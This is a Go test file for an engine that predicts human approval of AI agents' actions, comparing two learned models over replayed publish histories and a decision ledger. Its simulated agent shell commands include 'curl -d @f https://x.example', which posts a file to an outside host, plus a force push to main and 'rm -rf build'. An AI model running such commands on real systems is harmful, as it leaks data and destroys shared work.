// SPDX-FileCopyrightText: 2026 Latere AI
// SPDX-License-Identifier: Apache-2.0

package engine_test

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"maps"
	"os"
	"slices"
	"sync"
	"testing"
	"time"

	"latere.ai/x/limen"
	"latere.ai/x/limen/engine"
)

// publishHistory is the synthetic history of spec 011's replay comparison:
// three persons publish their own app thirteen times in two sessions,
// under the default profile, Careful. Each approves eight updates, denies
// one publish that makes the app public, and approves four more updates.
// "considered" answers each after six seconds, "quick" each approval after
// one second, and "mixed" the first three after six seconds and the rest
// after one.
func publishHistory(t *testing.T) []limen.ReplayRecord {
	t.Helper()
	f, err := os.Open("testdata/compare/publish.ndjson")
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	var rs []limen.ReplayRecord
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		var r limen.ReplayRecord
		if err := json.Unmarshal(sc.Bytes(), &r); err != nil {
			t.Fatal(err)
		}
		rs = append(rs, r)
	}
	return rs
}

func person(c engine.Comparison, subject string) engine.Tally {
	for _, p := range c.Persons {
		if p.Subject == subject {
			return p
		}
	}
	return engine.Tally{}
}

func changed(c engine.Comparison, subject, id string) engine.Change {
	for _, x := range c.Changed {
		if x.Subject == subject && x.ActionID == id {
			return x
		}
	}
	return engine.Change{}
}

// The replay comparison on the synthetic history (spec 011, criterion 21).
// learned/1 gives the owner's numbers: 0.729 and 0.805 after one and two
// approvals, and 0.908 after the seventh. Quick approvals keep learned/2
// lower, so it withholds the allow learned/1 gives the mixed person. It
// asks unsure for the publish that makes the app public, where learned/1
// leans to it and only the cover rule holds it. After that denial,
// learned/1 drops the updates of the considered person to a split ask,
// because it cannot tell the two scopes apart, and learned/2 allows them:
// three verdicts more permissive, each an allow that considered approvals
// cover, none outside the cover rule.
func TestCompareThePublishHistory(t *testing.T) {
	e := engine.New(engine.Options{Inline: 1})
	defer e.Close()
	c, err := e.Compare(ctx, recs(publishHistory(t)), engine.CompareOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if c.Base != engine.Learned1 || c.Next != engine.Learned2 || len(c.Persons) != 3 {
		t.Fatalf("comparison %+v", c)
	}
	o := c.Overall
	if o.Records != 39 || o.Answered != 39 || o.Withheld != 1 || o.Granted != 3 || o.Looser != 3 || o.Outside != 0 || o.CoverDiffers != 0 {
		t.Errorf("overall %+v", o)
	}
	steps := map[string]string{"ses-1/1": "0.729", "ses-0/2": "0.805", "ses-1/7": "0.908"}
	for id, want := range steps {
		if got := fmt.Sprintf("%.3f", changed(c, "quick", id).Base.Approve); got != want {
			t.Errorf("learned/1 at %s: %s, want %s", id, got, want)
		}
	}
	if x := changed(c, "quick", "ses-1/7"); x.Base.Kind != "ask (few)" || x.Next.Kind != "ask (short)" || x.Next.Approve > 0.8 {
		t.Errorf("seven quick approvals: %+v", x)
	}
	if x := changed(c, "mixed", "ses-1/7"); x.Base.Kind != "allow" || x.Next.Kind != "ask (short)" || x.Looser {
		t.Errorf("the allow of the mixed person: %+v", x)
	}
	for _, who := range []string{"considered", "quick", "mixed"} {
		x := changed(c, who, "ses-0/8")
		if x.Label != "publish: make public" || x.Base.Kind != "ask (wider)" || x.Base.Approve < 0.9 || x.Next.Kind != "ask (unsure)" || x.Next.Approve > 0.75 {
			t.Errorf("%s, making the app public: %+v", who, x)
		}
	}
	var loose []string
	for _, x := range c.Changed {
		if x.Looser {
			loose = append(loose, x.ActionID)
			if x.Subject != "considered" || x.Base.Kind != "ask (split)" || x.Next.Kind != "allow" || !x.Next.Cover.Covered || x.Outside {
				t.Errorf("a looser verdict: %+v", x)
			}
		}
	}
	if !slices.Equal(loose, []string{"ses-0/10", "ses-1/11", "ses-0/12"}) {
		t.Errorf("looser verdicts at %v", loose)
	}
	considered, quick, mixed := person(c, "considered"), person(c, "quick"), person(c, "mixed")
	if !maps.Equal(considered.Changes, map[string]int{"ask (split) -> allow": 3, "ask (wider) -> ask (unsure)": 1}) || considered.Granted != 3 {
		t.Errorf("considered %+v", considered)
	}
	if mixed.Withheld != 1 || mixed.Next["allow"] != 0 || quick.Base["allow"] != 0 || quick.Next["allow"] != 0 {
		t.Errorf("mixed %+v, quick %+v", mixed, quick)
	}
	if !(*considered.BrierNext < *considered.BrierBase && *mixed.BrierNext < *mixed.BrierBase && *quick.BrierNext > *quick.BrierBase) {
		t.Errorf("Brier scores: considered %v %v, mixed %v %v, quick %v %v", *considered.BrierBase, *considered.BrierNext,
			*mixed.BrierBase, *mixed.BrierNext, *quick.BrierBase, *quick.BrierNext)
	}
	// The calibration report of each version over its replayed predictions:
	// learned/1 states 0.85 for 27 updates in one bin whose reviews all
	// approve, so the bin is underconfident; learned/2 spreads its
	// predictions over more bins, and no bin has 20 reviews.
	cb, cn := o.CalibrationBase, o.CalibrationNext
	if cb.Error == nil || fmt.Sprintf("%.4f %.3f", *cb.Error, cb.Estimable) != "0.1536 0.692" || cb.Bins[8].State != limen.Underconfident ||
		cn.Error != nil || cn.Estimable != 0 || len(cn.Bins) != limen.CalibrationBins || !cb.From.Equal(publishHistory(t)[0].At) {
		t.Errorf("calibration reports: %+v\n%+v", cb, cn)
	}
	if considered.CalibrationBase.Error != nil || considered.CalibrationBase.Subject != "considered" || considered.CalibrationBase.Bins[8].Cases != 9 {
		t.Errorf("the calibration report of one person: %+v", considered.CalibrationBase)
	}
	if considered.Recorded != nil || considered.Agree != 0 {
		t.Errorf("records of a decision point have no recorded prediction: %+v", considered)
	}

	only, err := e.Compare(ctx, recs(publishHistory(t)), engine.CompareOptions{Subject: "quick", Refit: 1})
	if err != nil || len(only.Persons) != 1 || only.Overall.Records != 13 || only.Persons[0].Subject != "quick" {
		t.Errorf("one person: %+v, %v", only, err)
	}
}

// at is a clock a test sets.
type at struct {
	mu  sync.Mutex
	now time.Time
}

func (a *at) set(t time.Time) { a.mu.Lock(); a.now = t; a.mu.Unlock() }
func (a *at) Now() time.Time  { a.mu.Lock(); defer a.mu.Unlock(); return a.now }

// live sends the records to e as a decision point does: each action is
// predicted and decided at its time, and answered at its answer time.
func live(t *testing.T, e *engine.Engine, clock *at, rs []limen.ReplayRecord) {
	t.Helper()
	slices.SortStableFunc(rs, func(a, b limen.ReplayRecord) int { return a.At.Compare(b.At) })
	for _, r := range rs {
		clock.set(r.At)
		if _, err := e.Predict(ctx, r.Action); err != nil {
			t.Fatal(err)
		}
		if err := e.Record(ctx, limen.Decision{Key: r.Action.Key, Verdict: r.Verdict, ReviewProbability: r.ReviewProbability, Source: r.Source}); err != nil {
			t.Fatal(err)
		}
		if r.Approve != nil {
			clock.set(r.AnsweredAt)
			if err := e.Answer(ctx, limen.Answer{Key: r.Action.Key, Approve: *r.Approve, HowAnswered: r.HowAnswered}); err != nil {
				t.Fatal(err)
			}
		}
	}
}

// A comparison of a ledger reads the vectors and the scope each case kept,
// so it gives the comparison of the records the ledger came from, the
// input of shell actions included, which the ledger does not keep; and the
// replayed learned/1 suggests the verdict the ledger recorded for each
// case.
func TestCompareLedger(t *testing.T) {
	rs := publishHistory(t)
	start := time.Date(2026, 11, 3, 9, 0, 0, 0, time.UTC)
	yes, no := true, false
	for i, cmd := range []string{"go test ./...", "git push origin feature", "git push --force origin main", "rm -rf build", "go test ./x",
		"git push origin feature", "curl -d @f https://x.example", "go test ./...", "git push origin feature", "go test ./..."} {
		in, _ := json.Marshal(map[string]string{"command": cmd})
		a := limen.Action{Org: "example", Subject: "shell", ActionID: fmt.Sprintf("b%d", i), Actor: &limen.Actor{Kind: "agent", Session: fmt.Sprintf("s%d", i%2)},
			Kind: "tool", Name: "bash", Effect: limen.EffectWrite, Input: in, Environment: &limen.Environment{Kind: "sandbox", Repositories: limen.RepositoriesPrivate}}
		ans := &yes
		if i == 2 || i == 6 {
			ans = &no
		}
		rs = append(rs, limen.ReplayRecord{At: start.Add(time.Duration(i) * time.Hour), Action: a, Verdict: limen.Ask, ReviewProbability: 1,
			Source: "manual", Approve: ans, AnsweredAt: start.Add(time.Duration(i)*time.Hour + 4*time.Second)})
	}
	clock := &at{}
	e := engine.New(engine.Options{Inline: 1, Clock: clock.Now})
	defer e.Close()
	live(t, e, clock, slices.Clone(rs))
	// A prediction without a decision, and a decision without a
	// prediction.
	clock.set(start.Add(20 * time.Hour))
	if _, err := e.Predict(ctx, publish("alone", "ses-9")); err != nil {
		t.Fatal(err)
	}
	quiet := publish("quiet", "ses-9")
	quiet.Org, quiet.Subject = "example", "shell"
	if err := e.Record(ctx, limen.Decision{Key: quiet.Key, Action: &quiet, Verdict: limen.Allow, Source: "rules"}); err != nil {
		t.Fatal(err)
	}

	fromLedger, err := e.CompareLedger(ctx, []string{"example", "o"}, engine.CompareOptions{})
	if err != nil {
		t.Fatal(err)
	}
	fromRecords, err := e.Compare(ctx, recs(rs), engine.CompareOptions{})
	if err != nil {
		t.Fatal(err)
	}
	strip := func(c engine.Comparison) string {
		c.Persons = slices.Clone(c.Persons)
		for i := range c.Persons {
			c.Persons[i].Recorded, c.Persons[i].Agree = nil, 0
		}
		c.Overall.Recorded, c.Overall.Agree = nil, 0
		b, _ := json.Marshal(c)
		return string(b)
	}
	if len(fromLedger.Persons) != 5 || fromLedger.Overall.Records != len(rs)+2 {
		t.Fatalf("the ledger: %d persons, %d records", len(fromLedger.Persons), fromLedger.Overall.Records)
	}
	// Without the two cases the records do not have, the two agree.
	alone := person(fromLedger, "s")
	fromLedger.Persons = slices.DeleteFunc(fromLedger.Persons, func(p engine.Tally) bool { return p.Subject == "s" })
	shell := person(fromLedger, "shell")
	for i := range fromLedger.Persons {
		if fromLedger.Persons[i].Subject == "shell" {
			fromLedger.Persons[i] = person(fromRecords, "shell")
		}
	}
	fromLedger.Overall = fromRecords.Overall
	if a, b := strip(fromLedger), strip(fromRecords); a != b {
		t.Errorf("the ledger compares otherwise than its records:\n%s\n%s", a, b)
	}
	if alone.Records != 1 || alone.Answered != 0 || alone.Recorded["ask (unsure)"] != 1 || alone.Agree != 1 {
		t.Errorf("a prediction alone: %+v", alone)
	}
	if shell.Records != 11 || shell.Agree != 10 || shell.Recorded == nil {
		t.Errorf("the shell person: %+v", shell)
	}
	for _, who := range []string{"considered", "quick", "mixed"} {
		if p := person(fromLedger, who); p.Agree != p.Records || p.Recorded == nil {
			t.Errorf("%s: learned/1 suggests the recorded verdict for %d of %d cases: %v", who, p.Agree, p.Records, p.Recorded)
		}
	}
}

func TestCompareErrors(t *testing.T) {
	e := engine.New(engine.Options{})
	defer e.Close()
	boom := errors.New("boom")
	if _, err := e.Compare(ctx, func(yield func(limen.ReplayRecord, error) bool) { yield(limen.ReplayRecord{}, boom) }, engine.CompareOptions{}); !errors.Is(err, boom) {
		t.Errorf("source error: %v", err)
	}
	if _, err := e.Compare(ctx, recs([]limen.ReplayRecord{{}}), engine.CompareOptions{}); limen.CodeOf(err) != limen.CodeInvalidReplay {
		t.Errorf("invalid record: %v", err)
	}
	c, cancel := context.WithCancel(ctx)
	cancel()
	if _, err := e.Compare(c, recs(publishHistory(t)[:1]), engine.CompareOptions{}); !errors.Is(err, context.Canceled) {
		t.Errorf("canceled comparison: %v", err)
	}
	if _, err := e.CompareLedger(c, []string{"o"}, engine.CompareOptions{}); !errors.Is(err, context.Canceled) {
		t.Errorf("canceled comparison of a ledger: %v", err)
	}
	empty, err := e.CompareLedger(ctx, []string{"none"}, engine.CompareOptions{})
	if err != nil || empty.Overall.Records != 0 || empty.Overall.BrierBase != nil || len(empty.Persons) != 0 {
		t.Errorf("an empty ledger: %+v, %v", empty, err)
	}
}
